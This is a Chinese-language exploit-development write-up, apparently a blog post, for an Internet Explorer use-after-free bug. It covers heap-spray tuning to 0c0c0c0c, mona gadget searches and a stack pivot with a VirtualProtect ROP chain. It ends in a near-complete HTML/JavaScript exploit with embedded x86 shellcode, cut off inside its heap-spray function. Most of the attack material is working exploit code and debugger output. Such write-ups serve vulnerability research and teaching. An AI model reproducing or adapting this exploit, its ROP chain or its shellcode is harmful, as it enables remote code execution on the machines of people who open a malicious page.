    ​    nop=nop.substring(0,(0x80000-6)/2-sc.length);
    ​    code=sc+nop;
    ​    heap_chunks=new Array();
    ​    for(i=0;i
查看0c0c0c0c的内存发现成功覆盖，但是我们需要到是能精准对将ROP链/Shellcode的头部对准0c0c0c0c的位置。
查看0c0c0c0c堆块的堆头为0c0a0018。一个堆块对应我们使用JS分配的8MB的heap_chunk。
而UserPtr也就数据存放的开头为0c0a0030(一般来说是0c010020但是我调试时开了Enable heap
tagging)，查看这个区域我们输入数据头部就是从UserPtr+8的位置开始的。
可以看出堆空间的起始地址的最后四位都变成了0018，UserPtr的最后四位则为0030.
这是在大量分配内存之后会产生的现象。
虽然每次分配的值地址不一定完全相同，比如第一次0c0c0c0c所在用户堆起始地址为0c0a0030，偏移为0x20bdc，而第二次则为0c0b0030，偏移为0x10bdc。
但是变化范围都是以0x10000为基数的，只需要在heap_chunk中以0x10000为单位配置好shellcode+nops的格式。最后heap_chunk整体加上偏移地址0xbdc，无论地址怎么变化，都能顺利让0c0c0c0c指向函数shellocode的起始地址。
修改HeapSpray,成功利用heap-feng-shui技术将0c0c0c0c的位置精确定为我们shellcode的起始地址。代码如下。
可以看到我们内存中每隔0x1000都会存在一个shellcode+nop的结构。这样能让0c0c0c0c具有某种程度上的稳定。
HeapSpray.html
    ​    
    ​    var sc="u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141u4141";
    ​    var nop="u0c0cu0c0c";
    ​    var offset=0x5ee-4/2;//0xbdc/2-4/2
    ​    //以0x10000为单位的shellcode+nop结构单元
    ​    while(nop.length
将这段代码替换poc中的heapspray函数，运行poc发现，程序成功跳转到41414141的位置。（因为0c0c0c0c地址已经被AAAA覆盖）
接下来只需要构造ROP链，使用VirtualProtect函数将0c0c0c0c开始的内存设置为可执行即可。大概参数可以
    BOOL VirtualProtect(
    shellcode 所在内存空间起始地址,
    shellcode 大小,
    0x40,
    某个可写地址
    );
可以使用mona插件快速寻找gadgets
    !py mona findwild -s "mov esp,eax#*#retn"
    0x760f0b51 |   0x760f0b51 (b+0x002b0b51)  : mov esp,eax # dec ecx # retn
    0x760e0ae2 |   0x760e0ae2 (b+0x002a0ae2)  : mov esp,ecx # dec ecx # retn 4
###  1.1.4构造ROP链
翻转栈帧到堆空间
因为发生UAF之后，ESP指向的是当前的栈空间，而我们的rop链是放在heap里的。所以需要使用栈翻转，将esp指向我们堆中的rop链。这个部分也是非常有意思的。
步骤（0）首先eax是我们可控的参数（通过占位TreeNode），ecx的值来源为[eax],所以eax的值不能直接指向我们的rop链，因为这样ecx会读取不到正确的值，call
[ecx]也就不能跳转。
步骤（1）ROP链头部必须执行栈翻转操作，否则rop链将无法成功执行。
看大佬的案例是寻找xchg指令，对esp进行赋值。但是我并没有找到很合适的gadget。
    !py mona find -s "x94xc3" 或者!py mona.py findwild -s "xchg esp,eax#*#retn"
    0x736c32fa |   0x736c32fa (b+0x000132fa)  : x94xc3
不过上穷水尽疑无路，柳暗花明又一村。我们找到了一组包含pop esp的gadget，可以修改esp为0c0c0c0c
    !py mona.py findwild -s "push ecx#*#pop esp#*#retn"
    0x75b48d9e |   0x75b48d9e (b+0x00398d9e)  : push ecx # pop esp # pop ebp # retn 4
步骤（2）上一个步骤执行到ret命令时，esp=0c0c0c10，所以在0c0c0c10起始埋下我们到ROP链接就行。
步骤（3）ROP设置shellcode内存可执行之后，跳转到shellcode运行即可。
ROP流程图
    Heap    
    (0) Reg  eip->0c0c0c0c ecx=0c0c0c0c eax=0c0c0c04 esp=>stack
    (1)=>0c0c0c0c  push ecx#pop esp#..#ret 4  =>  esp=0c0c0c0c+4=>heap
    (2)=>0c0c0c10 ret =>esp=0c0c0c10+4+4(因为ret4) 
    0c0c0c14 0c0c0c0c (跳过4字节)
    (3)=>0c0c0c18  VirtualProtect_addr =>esp=0c0c0c10->0c0c0c18(因为ret4)
    ...   0c0c0c1c shellcode_addr ->0c0c0c30
    0c0c0c20  0c0c0c00 [arg4]
    0c0c0c24  0x1000 [arg3]
    0c0c0c28  0x40 [arg2]
    0c0c0c2c  0c0c0c0c[arg1]
    (3)    0c0c0c30 shellcode
编写出EXP利用脚本
    ​    Migraine
    ​    Hello World!
    ​        function trigger()
    ​        {
    ​            Math.tan(2,1);
    ​            var father=document.createElement("father");
    ​            var child=document.createElement("child");
    ​            Math.tan(1,2);
    ​            document.body.appendChild(father);
    ​            document.body.appendChild(child);
    ​            Math.sin(1,2);
    ​            child.applyElement(father);
    ​            
    ​            father.onlosecapture=function() {
    ​                Heapspray();
    ​                document.write("");
    ​                //Math.cos(1,2);
    ​                
    ​                tt = new Array(20);
    ​                for(i = 0; i < tt.length; i++) {
    ​                  tt[i] = document.createElement('div');
    ​                  //tt[i].className = "u0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0c";//39x2字节
    ​                tt[i].className = "u0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04u0c0cu0c04";
    ​                //将eax赋值为0c0c0c00
    ​                
    ​                }
    ​                
    ​                Math.sin(1,2);
    ​                //alert("123");
    ​            }
    ​            Math.cos(1,2);
    ​            father['outerText']="";
    ​            Math.cos(1,2);
    ​            father.setCapture();
    ​            child.setCapture();
    ​            function Heapspray()
    ​            {
    ​                //var rop_gadget="u0ae2u760e"; //760e0ae2 #mov esp,eax #dec ecx#retn
    ​                var rop_gadget="u8d9eu75b4" //0x75b48d9e push ecx # pop esp #pop ebp
    ​                                +"u1480u7690" //0x76901480 ret
    ​                                +"u0c0cu0c0c"  //4 size
    ​                                +"u20d8u7690" //VirtualProtect 0x769020d8
    ​                                +"u0c30u0c0c"// shellcode_addr
    ​                                +"u0c00u0c0c"//arg4
    ​                                +"u1000u0000"//arg3
    ​                                +"u0040u0000"//arg2
    ​                                +"u0c0cu0c0c";//arg1
    ​                var shellcode="uc931u8b64u3041u408bu8b0cu1470u96adu8badu1058u538Bu013cu8bdau7852uda01u728bu0120u31deu41c9u01adu81d8u4738u7465u7550u81f4u0478u6f72u4163ueb75u7881u6408u7264u7565u8be2u2472ude01u8b66u4e0cu8b49u1c72ude01u148bu018eu31dau53c9u5152u6168u7972u6841u694cu7262u4c68u616fu5464uff53u83d2u0cc4u5059uc031ub866u6c6cu6850u3233u642eu7568u6573u5472u54ffu1024uc483u500cuc031u6fb8u4178u5023u6c83u0324u6823u6761u4265u4d68u7365u5473u74ffu1024u54ffu1c24uc483u500cuc031ub866u4646u5450uc031u41b8u4141u5023u6c83u0324u5423uc031uff50u2474uff04u2474u3110u50c0u54ffu2024uc483u0010";
    ​                var shellcode_old="u68fcu0a6au1e38u6368ud189u684fu7432u0c91uf48bu7e8du33f4ub7dbu2b04u66e3u33bbu5332u7568u6573u5472ud233u8b64u305au4b8bu8b0cu1c49u098bu698buad08u6a3du380au751eu9505u57ffu95f8u8b60u3c45u4c8bu7805ucd03u598bu0320u33ddu47ffu348bu03bbu99f5ube0fu3a06u74c4uc108u07caud003ueb46u3bf1u2454u751cu8be4u2459udd03u8b66u7b3cu598bu031cu03ddubb2cu5f95u57abu3d61u0a6au1e38ua975udb33u6853u6961u656eu6d68u6769u8b72u53c4u5050uff53ufc57uff53uf857";
    ​                var sc="u0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0cu0c0c"+rop_gadget+shellcode;
    ​                var nop="u0c0cu0c0c";
    ​                var offset=0x5ee-4/2;//0xbdc/2-4/2
    ​                while(nop.length<0x10000)
    ​                    nop+=nop;